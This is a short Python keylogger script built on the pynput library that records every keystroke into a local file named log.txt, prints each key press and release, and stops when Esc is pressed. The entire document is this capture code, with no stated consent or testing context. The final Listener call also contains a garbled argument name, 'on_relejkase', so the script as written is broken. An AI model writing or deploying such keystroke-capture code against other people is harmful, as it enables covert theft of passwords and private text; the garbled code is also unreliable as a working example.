# # Will use pynut
# # install pynput

import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_files(keys)

    try:
        print("alphanumeric {0} pressed".format(key.char))
    except AttributeError:
        print("special key{0} presses".format(key))

def write_files(keys):
    with open("log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'","")
            f.write(k)
            f.write(' ')

def on_release(key):
    print("{0} released".format(key))
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press,
              on_relejkase= on_release) as listener:
    listener.join()


